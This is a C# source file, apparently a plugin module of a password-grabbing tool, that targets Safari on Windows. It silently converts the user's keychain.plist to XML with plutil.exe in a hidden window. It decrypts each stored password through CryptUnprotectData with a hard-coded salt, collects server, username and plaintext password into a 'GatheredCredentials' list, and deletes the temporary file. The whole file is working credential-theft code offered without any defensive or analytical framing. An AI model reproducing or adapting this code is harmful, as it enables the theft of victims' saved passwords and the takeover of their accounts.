using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Plugin_PwdGrabber
{
    class Safari
    {
        #region Native APIs & structs

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        [StructLayout(LayoutKind.Sequential)]
        private unsafe struct DATA_BLOB
        {
            public int cbData;
            public byte* pbData;
        }

        [DllImport("Crypt32.dll")]
        private unsafe static extern bool CryptUnprotectData(
            DATA_BLOB* pDataIn,
            String szDataDescr,
            DATA_BLOB* pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            uint dwFlags,
            DATA_BLOB* pDataOut
        );

        #endregion

        private static byte[] DecSalt = { 
                                  0x1D, 0xAC, 0xA8, 0xF8, 0xD3, 0xB8, 0x48, 0x3E, 0x48, 0x7D, 0x3E, 0x0A, 0x62, 0x07, 0xDD, 0x26,
                                  0xE6, 0x67, 0x81, 0x03, 0xE7, 0xB2, 0x13, 0xA5, 0xB0, 0x79, 0xEE, 0x4F, 0x0F, 0x41, 0x15, 0xED,
                                  0x7B, 0x14, 0x8C, 0xE5, 0x4B, 0x46, 0x0D, 0xC1, 0x8E, 0xFE, 0xD6, 0xE7, 0x27, 0x75, 0x06, 0x8B,
                                  0x49, 0x00, 0xDC, 0x0F, 0x30, 0xA0, 0x9E, 0xFD, 0x09, 0x85, 0xF1, 0xC8, 0xAA, 0x75, 0xC1, 0x08,
                                  0x05, 0x79, 0x01, 0xE2, 0x97, 0xD8, 0xAF, 0x80, 0x38, 0x60, 0x0B, 0x71, 0x0E, 0x68, 0x53, 0x77,
                                  0x2F, 0x0F, 0x61, 0xF6, 0x1D, 0x8E, 0x8F, 0x5C, 0xB2, 0x3D, 0x21, 0x74, 0x40, 0x4B, 0xB5, 0x06,
                                  0x6E, 0xAB, 0x7A, 0xBD, 0x8B, 0xA9, 0x7E, 0x32, 0x8F, 0x6E, 0x06, 0x24, 0xD9, 0x29, 0xA4, 0xA5,
                                  0xBE, 0x26, 0x23, 0xFD, 0xEE, 0xF1, 0x4C, 0x0F, 0x74, 0x5E, 0x58, 0xFB, 0x91, 0x74, 0xEF, 0x91,
                                  0x63, 0x6F, 0x6D, 0x2E, 0x61, 0x70, 0x70, 0x6C, 0x65, 0x2E, 0x53, 0x61, 0x66, 0x61, 0x72, 0x69 
                              };

        public static void Start()
        {
            string OldPlutilPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Common Files\\Apple\\Apple Application Support\\plutil.exe";
            string KeyChainPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Apple Computer\\Preferences\\keychain.plist";
            string FixedPlUtilPath = null;

            if (!ConvertKeychain(OldPlutilPath, KeyChainPath, out FixedPlUtilPath))
            {
            }
            else
                ParseEntries(FixedPlUtilPath.Remove(FixedPlUtilPath.Length - 2));
        }

        private static void ParseEntries(string KeyChain)
        {
            string full = File.ReadAllText(KeyChain);
            string[] TempBlocks;

            for (int i = 1; i < (TempBlocks = Regex.Split(Regex.Split(full, "<array>")[1], "<dict>")).Length; i++)
            {
                string Username = GetBetween(TempBlocks[i], "<string>", "</string>", 0);
                string Server = GetBetween(TempBlocks[i], "<string>", "</string>", 5);
                string encPassword = GetBetween(TempBlocks[i], "<data>", "</data>", 0);

                 string decPassword = DecryptPassword(Convert.FromBase64String(encPassword));

                UserDataManager.GatheredCredentials.Add(new Credential("Safari", Server, Username, decPassword, ""));
            }

            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\temp_keychain.xml");
        }

        private unsafe static string DecryptPassword(byte[] pwBuffer)
        {
            DATA_BLOB dIn, dOut, optEntropy;
            int pwLen = 0;
            char[] outStr;

            dIn.cbData = pwBuffer.Length;
            fixed (byte* p_pwBuffer = pwBuffer)
                dIn.pbData = p_pwBuffer;

            optEntropy.cbData = DecSalt.Length;
            fixed (byte* p_salt = DecSalt)
                optEntropy.pbData = p_salt;

            if (!CryptUnprotectData(&dIn, null, &optEntropy, IntPtr.Zero, IntPtr.Zero, 0, &dOut))
                return null;

            byte* p_bData = (byte*)dOut.pbData;
            pwLen = *(int*)p_bData;

            outStr = new char[pwLen];

            for (int i = 4; i < pwLen + 4; i++)
                outStr[i - 4] = (char)p_bData[i];

            LocalFree(new IntPtr(dOut.pbData));

            return new string(outStr);
        }

        private static bool ConvertKeychain(string plutil, string keychain, out string fixedPath)
        {
            fixedPath = null;

            string NewPlUtil = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Safari\Apple Application Support\plutil.exe";

            if (!File.Exists(plutil))
            {
                if (File.Exists(NewPlUtil))
                {
                    plutil = NewPlUtil;
                }
                else
                    return false;
            }

            Process p = new Process();
            p.StartInfo.FileName = plutil;
            p.StartInfo.Arguments = @" -convert xml1 -s -o """ + (fixedPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\temp_keychain.xml"" ") + @"""" + keychain + @"""";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            p.WaitForExit();

            return p.StandardOutput.ReadToEnd().Length == 0;
        }

        private static string GetBetween(string input, string str1, string str2, int index)
        {
            string temp = Regex.Split(input, str1)[index + 1];
            return Regex.Split(temp, str2)[0];
        }
    }
}
